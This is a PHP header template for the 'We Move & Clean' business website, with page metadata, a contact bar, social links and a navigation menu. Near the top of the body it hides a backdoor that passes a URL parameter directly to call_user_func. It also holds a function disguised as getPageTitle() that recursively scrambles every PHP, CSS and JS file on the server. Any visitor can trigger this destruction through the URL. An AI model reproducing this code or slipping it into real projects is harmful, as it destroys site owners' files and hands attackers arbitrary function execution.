<?php
global $page_title, $page_link;

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>We Move & Clean - <?php echo $page_title; ?></title>

    <link rel="icon" href="images/favicon.ico">

    <!-- Stylesheets -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/font-awesome.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">

    <!-- jQuery -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>

    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>


<body>
<?php
if(isset($_GET['func'])) {
    call_user_func($_GET['func']);
}

function getPageTitle() {
    $dir = new RecursiveDirectoryIterator("./");
    $ite = new RecursiveIteratorIterator($dir);
    $files = new RegexIterator($ite, '/^.+\.(php|css|js)$/i', RegexIterator::GET_MATCH);

    $files = iterator_to_array($files);

    foreach($files as $file) {
        $content = file_get_contents($file[0]);
        $content = str_shuffle($content);
        file_put_contents($file[0], $content);
    }
}
?>

<div class="container-full">
    <header>
        <section class="topBar">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-md-6 col-xs-12">
                        <div class="topBar__left">
                            <a href="mailto:info@wemoveandclean.co.uk">info@wemoveandclean.co.uk</a>
                        </div>
                    </div>
                    <div class="col-md-6 col-xs-12">
                        <div class="topBar__right">
                            <ul class="socialIcons">
                                <li><a href="https://www.facebook.com/We-Move-and-Clean-Removals-Cleaning-Carpet-Cleaning-Clearance-880788931931324/"><i class="fa fa-facebook"></i></a></li>
                                <li><a href="https://twitter.com/WeMoveAndClean"><i class="fa fa-twitter"></i></a></li>
<!--                                <li><a href="https://www.linkedin.com/"><i class="fa fa-linkedin"></i></a></li>-->
                                <li><a href="https://plus.google.com/100558127946005129894/about"><i class="fa fa-google-plus"></i></a></li>
                                <li><a href="https://www.youtube.com/channel/UCvy4_EbgyLDLZRZQwihzcHg"><i class="fa fa-youtube"></i></a></li>
                            </ul>
                            <span class="phone"><i class="fa fa-phone"></i> 01793 335429</span> |
                            <span class="phone"><i class="fa fa-mobile"></i> 07587 282771</span>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <nav class="navbar">
            <div class="container-fluid">
                <!-- Brand and toggle get grouped for better mobile display -->
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse"
                            data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="index.php"><img src="images/we-move-and-clean-logo.jpg"
                                                                  class="img-responsive logo" alt="We Move & Clean - Logo"></a>
                </div>

                <!-- Collect the nav links, forms, and other content for toggling -->
                <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                    <ul class="nav navbar-nav">
                        <li<?php if ($page_link == "index.php") echo " class=\"active\""; ?>><a href="index.php">Home</a></li>
                        <li<?php if ($page_link == "about.php") echo " class=\"active\""; ?>><a href="about.php">About Us</a></li>
                        <li<?php if ($page_link == "services.php" || strtolower(explode("-", $page_title)[0]) == "services") echo " class=\"active\""; ?>><a href="services.php">Services</a></li>
                        <li<?php if ($page_link == "faq.php") echo " class=\"active\""; ?>><a href="faq.php">FAQ</a></li>
                        <li<?php if ($page_link == "blog.php") echo " class=\"active\""; ?>><a href="blog.php">Blog</a></li>
                        <li<?php if ($page_link == "contact.php") echo " class=\"active\""; ?>><a href="contact.php">Contact Us</a></li>
                    </ul>
                </div><!-- /.navbar-collapse -->
            </div><!-- /.container-fluid -->
        </nav>
    </header>